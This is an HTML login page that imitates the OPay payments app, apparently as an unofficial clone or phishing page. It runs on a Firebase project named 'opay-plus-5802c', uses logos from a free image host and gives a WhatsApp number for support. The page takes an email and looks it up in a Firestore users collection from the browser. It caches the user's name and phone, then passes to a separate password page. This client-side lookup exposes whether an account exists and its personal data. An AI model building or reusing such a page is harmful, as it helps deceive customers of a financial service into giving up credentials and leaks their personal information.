<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Log in to OPay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* ===== THEME VARIABLES ===== */
        :root {
            --bg-color: #ffffff;
            --text-color: #1a1a1a;
            --header-bg: #ffffff;
            --input-border: #e0e0e0;
            --input-focus: #00B876;
            --input-bg: #ffffff;
            --label-color: #00B876;
            --error-color: #dc2626;
            --helper-color: #666;
            --helper-link: #00B876;
            --btn-bg: #00B876;
            --btn-disabled-opacity: 0.5;
            --btn-enabled-opacity: 1;
            --signup-text: #666;
            --signup-link: #00B876;
            --back-icon: #1a1a1a;
            --help-link: #00B876;
            --modal-overlay: rgba(0,0,0,0.5);
            --modal-bg: #ffffff;
            --modal-text: #1a1a1a;
            --modal-input-border: #e0e0e0;
        }

        body.dark-theme {
            --bg-color: #121212;
            --text-color: #e0e0e0;
            --header-bg: #1e1e1e;
            --input-border: #333333;
            --input-focus: #1e9c43;
            --input-bg: #2d2d2d;
            --label-color: #1e9c43;
            --error-color: #f87171;
            --helper-color: #b0b0b0;
            --helper-link: #1e9c43;
            --btn-bg: #1e9c43;
            --btn-disabled-opacity: 0.3;
            --btn-enabled-opacity: 1;
            --signup-text: #b0b0b0;
            --signup-link: #1e9c43;
            --back-icon: #e0e0e0;
            --help-link: #1e9c43;
            --modal-overlay: rgba(0,0,0,0.7);
            --modal-bg: #2d2d2d;
            --modal-text: #e0e0e0;
            --modal-input-border: #555;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            transition: background-color 0.3s, color 0.3s;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            background-color: var(--header-bg);
        }

        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
        }

        .back-icon {
            width: 20px;
            height: 20px;
            stroke: var(--back-icon);
            stroke-width: 2;
            fill: none;
        }

        .theme-toggle {
            width: 20px;
            height: 20px;
            cursor: pointer;
            stroke: var(--help-link);
            fill: none;
            stroke-width: 2;
            margin-right: 16px;
        }

        .help-link {
            color: var(--help-link);
            font-weight: 500;
            font-size: 13px;
            text-decoration: none;
            cursor: pointer;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin: 8px 0 24px;
            background-color: var(--bg-color);
        }

        .logo-container img {
            height: 36px;
            width: auto;
        }

        .main-content {
            flex: 1;
            padding: 0 20px;
            background-color: var(--bg-color);
        }

        .title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 28px;
            color: var(--text-color);
        }

        .input-group {
            position: relative;
            margin-bottom: 4px;
        }

        .input-field {
            width: 100%;
            padding: 14px 14px 14px 14px;
            border: 1px solid var(--input-border);
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            background-color: var(--input-bg);
            color: var(--text-color);
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            border-color: var(--input-focus);
            box-shadow: 0 0 0 3px rgba(0, 184, 118, 0.1);
        }

        .input-field.typing:not(.valid) {
            border-color: var(--error-color);
        }

        .input-field.valid {
            border-color: var(--input-focus);
        }

        .input-label {
            position: absolute;
            top: -8px;
            left: 12px;
            background-color: var(--bg-color);
            padding: 0 4px;
            font-size: 12px;
            font-weight: 500;
            color: var(--label-color);
            pointer-events: none;
        }

        .error-message {
            color: var(--error-color);
            font-size: 12px;
            margin-top: 4px;
            margin-bottom: 8px;
            display: none;
        }

        .bottom-section {
            margin-top: auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
            padding: 0 20px 20px;
            background-color: var(--bg-color);
        }

        .next-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--btn-bg);
            border: none;
            border-radius: 30px;
            color: white;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            opacity: var(--btn-disabled-opacity);
            transition: opacity 0.2s;
        }

        .next-btn.enabled {
            opacity: var(--btn-enabled-opacity);
        }

        /* ===== GREEN CIRCLE LOADER ===== */
        .loader {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.5);
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .green-ring {
            position: relative;
            width: 52px;
            height: 52px;
            border-radius: 50%;
            background-color: #1e9c43;
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-wrapper {
            width: 35px;
            height: 35px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 50%;
            background: white;
            box-shadow: 0 4px 0px rgba(0, 0, 0, 0.05);
            animation: pulse-zoom 0.7s ease-in-out infinite;
            z-index: 3;
        }

        .logo-image {
            width: 25px;
            height: 25px;
            object-fit: contain;
            border-radius: 50%;
        }

        .orbit {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            animation: rotate-dot 1.5s linear infinite;
            transform-origin: center center;
            z-index: 2;
        }

        .dot {
            position: absolute;
            top: 25px;
            left: 100%;
            transform: translateX(-1300%);
            width: 1px;
            height: 1px;
            background: white;
            border-radius: 60%;
            box-shadow: 0 0 8px 9px rgba(255, 255, 255, 0.5);
        }

        @keyframes pulse-zoom {
            0% { transform: scale(1.03); opacity: 0.8; }
            50% { transform: scale(1.15); opacity: 1; }
            100% { transform: scale(1.03); opacity: 0.8; }
        }

        @keyframes rotate-dot {
            from { transform: rotate(0deg); }
            to   { transform: rotate(360deg); }
        }

        /* Custom toast for errors */
        .toast-message {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #333;
            color: white;
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 14px;
            z-index: 1000;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <button class="back-btn" id="backBtn">
            <svg class="back-icon" viewBox="0 0 24 24">
                <path d="M15 18l-6-6 6-6"/>
            </svg>
        </button>
        <div style="display: flex; align-items: center;">
            <svg id="themeToggle" class="theme-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="5"></circle>
                <line x1="12" y1="1" x2="12" y2="3"></line>
                <line x1="12" y1="21" x2="12" y2="23"></line>
                <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                <line x1="1" y1="12" x2="3" y2="12"></line>
                <line x1="21" y1="12" x2="23" y2="12"></line>
                <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
            </svg>
            <a href="#" class="help-link" id="helpLink">Help</a>
        </div>
    </div>

    <div class="logo-container">
        <img src="https://iili.io/qpIrMgI.png" alt="OPay">
    </div>

    <div class="main-content">
        <h1 class="title">Log in to your account</h1>

        <div class="input-group">
            <label class="input-label">Enter your Email Address</label>
            <input type="email" id="loginEmail" class="input-field" autofocus>
        </div>
        <div id="emailError" class="error-message">Please enter a valid email address!</div>
    </div>

    <div class="bottom-section">
        <button id="nextBtn" class="next-btn" disabled>NEXT</button>
    </div>

    <!-- ===== GREEN CIRCLE LOADER ===== -->
    <div id="loadingPopup" class="loader">
        <div class="loader-container">
            <div class="green-ring">
                <div class="orbit"><div class="dot"></div></div>
                <div class="logo-wrapper">
                    <img src="https://iili.io/qT81u1e.png" alt="Loading Logo" class="logo-image">
                </div>
            </div>
        </div>
    </div>

    <div id="toast" class="toast-message"></div>

    <!-- Firebase SDK (module) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
        import { getFirestore, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAjLxkisBi9pzmjlwdHnYfo25XR2Z6ToEs",
            authDomain: "opay-plus-5802c.firebaseapp.com",
            projectId: "opay-plus-5802c",
            storageBucket: "opay-plus-5802c.firebasestorage.app",
            messagingSenderId: "967061625774",
            appId: "1:967061625774:web:236f88391ccdd9edd2863f",
            measurementId: "G-H0QV81VYBY"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Theme toggle
        const body = document.body;
        const savedTheme = localStorage.getItem('theme');
        const themeToggle = document.getElementById('themeToggle');
        if (savedTheme === 'dark') {
            body.classList.add('dark-theme');
            themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
        } else {
            themeToggle.innerHTML = `<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>`;
        }

        themeToggle.addEventListener('click', () => {
            if (body.classList.contains('dark-theme')) {
                body.classList.remove('dark-theme');
                localStorage.setItem('theme', 'light');
                themeToggle.innerHTML = `<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>`;
            } else {
                body.classList.add('dark-theme');
                localStorage.setItem('theme', 'dark');
                themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
            }
        });

        // Toast helper
        function showToast(message, isError = false) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.style.backgroundColor = isError ? '#dc2626' : '#333';
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }

        // Email validation
        const emailInput = document.getElementById('loginEmail');
        const nextBtn = document.getElementById('nextBtn');
        const errorDiv = document.getElementById('emailError');
        const loader = document.getElementById('loadingPopup');

        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function updateButtonState() {
            const value = emailInput.value.trim();
            const valid = isValidEmail(value);
            if (value.length > 0) emailInput.classList.add('typing');
            else emailInput.classList.remove('typing');
            if (valid) {
                emailInput.classList.add('valid');
                emailInput.classList.remove('typing');
            } else {
                emailInput.classList.remove('valid');
            }
            errorDiv.style.display = (value.length > 0 && !valid) ? 'block' : 'none';
            nextBtn.disabled = !valid;
            if (valid) nextBtn.classList.add('enabled');
            else nextBtn.classList.remove('enabled');
        }

        emailInput.addEventListener('input', updateButtonState);
        updateButtonState();

        // Next button: check Firestore for existing account
        nextBtn.addEventListener('click', async () => {
            if (nextBtn.disabled) return;

            const email = emailInput.value.trim().toLowerCase();
            loader.style.display = 'flex';

            try {
                // Query Firestore for user with this email
                const usersRef = collection(db, 'users');
                const q = query(usersRef, where('email', '==', email));
                const querySnapshot = await getDocs(q);

                if (querySnapshot.empty) {
                    // No account found – redirect to createacct.html
                    loader.style.display = 'none';
                    showToast('No account found with this email. Please create an account first.', true);
                    setTimeout(() => {
                        window.location.href = 'createacct.html';
                    }, 2000);
                    return;
                }

                // Account exists – retrieve user data
                const userDoc = querySnapshot.docs[0];
                const userData = userDoc.data();

                // Extract required fields with fallbacks
                const firstName = userData.firstName || 'User';
                const fullName = userData.fullName || userData.firstName || '';
                const phone = userData.phone || '';
                const tier = userData.tier !== undefined ? userData.tier : 0;

                // Save to localStorage for the password page
                localStorage.setItem('loginEmail', email);
                localStorage.setItem('loginFirstName', firstName);
                localStorage.setItem('loginFullName', fullName);
                localStorage.setItem('loginPhone', phone);
                localStorage.setItem('loginTier', tier);

                // Proceed to password page
                setTimeout(() => {
                    window.location.href = 'login-password.html';
                }, 500);
            } catch (error) {
                console.error('Firestore error:', error);
                loader.style.display = 'none';
                showToast('Unable to verify account. Please try again.', true);
            }
        });

        // Back button
        document.getElementById('backBtn').addEventListener('click', () => {
            window.history.back();
        });

        // Help link
        document.getElementById('helpLink').addEventListener('click', (e) => {
            e.preventDefault();
            window.open('https://wa.me/2349116125762?text=Hello%2C%20I%20need%20help%20logging%20in.', '_blank');
        });
    </script>
    <script src="/pwa-check.js"></script>
    <script src="/network-popup.js"></script>
</body>
</html>
